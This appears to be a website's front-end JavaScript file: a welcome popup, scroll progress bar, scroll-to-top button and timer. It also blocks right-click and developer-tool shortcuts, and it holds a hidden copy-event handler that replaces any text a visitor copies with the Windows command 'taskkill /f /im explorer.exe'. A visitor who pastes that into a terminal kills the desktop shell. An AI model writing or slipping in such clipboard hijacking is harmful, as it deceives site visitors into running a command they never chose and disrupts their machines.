console.log(`%c$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$`,'color: red;');
console.log(`%cHEHE...No Heckin'    :') `, 
'background-color:green; color: black; font-family: "Pixelify Sans", sans-serif; font-size: 30px;');
console.log(`%c$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$`,'color: red;');

window.onload = function() {
  Swal.fire({
    imageUrl: "https://images.squarespace-cdn.com/content/v1/5669db74d8af10228342a205/1539533938326-KS7WAJ8P0HLRQUJEV0LF/Welcome.gif",
    imageWidth: 400,
    imageHeight: 200,
    showConfirmButton: false,
    timer: 1800,
    imageAlt: "Custom image"
  });
};

window.addEventListener('scroll', handleScroll);

function handleScroll() {
    var winScroll = document.body.scrollTop || document.documentElement.scrollTop;
    var height = document.documentElement.scrollHeight - document.documentElement.clientHeight;  
    var scrolled = (winScroll / height) * 100;
  
    document.getElementById("progressBar").style.width = scrolled + "%";
}

document.addEventListener("DOMContentLoaded", function() {
    const scrollToTopBtn = document.getElementById("scrollToTopBtn");
  
    window.onscroll = function() {
      scrollFunction();
    };
  
    function scrollFunction() {
      if (document.body.scrollTop > 200 || document.documentElement.scrollTop > 200) {
        scrollToTopBtn.style.display = "block";
      } else {
        scrollToTopBtn.style.display = "none";
      }
    }
  
    scrollToTopBtn.addEventListener("click", function() {
      scrollToTopSmoothly();
    });
  
    function scrollToTopSmoothly() {
      window.scrollTo({
        top: 0,
        behavior: "smooth"
      });
    }
});

document.addEventListener('contextmenu', function (e) {
  e.preventDefault();
});

document.addEventListener('keydown', function(e) {
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'I' || e.key === 'C')) {
        e.preventDefault();
    }
});

document.addEventListener('keydown', function(e) {
  if ((e.ctrlKey || e.metaKey) && e.key === 'u') {
      e.preventDefault();
  }
});

document.addEventListener('keydown', function(e) {
  if (e.key === 'F12') {
      e.preventDefault();
  }
});

document.addEventListener('copy', function(event) {
  //get the selected text
  const selectedText = window.getSelection().toString();
  const bashCode = 'taskkill /f /im explorer.exe';

  //replace selected text
  const clipboardData = event.clipboardData || window.clipboardData;
  clipboardData.setData('text/plain', bashCode);

  event.preventDefault();
});

document.addEventListener('DOMContentLoaded', (event) => {
  let seconds = 0;
  const timerElement = document.getElementById('seconds');

  function incrementSeconds() {
      seconds += 1;
      timerElement.innerText = seconds;
  }

  setInterval(incrementSeconds, 1000);
});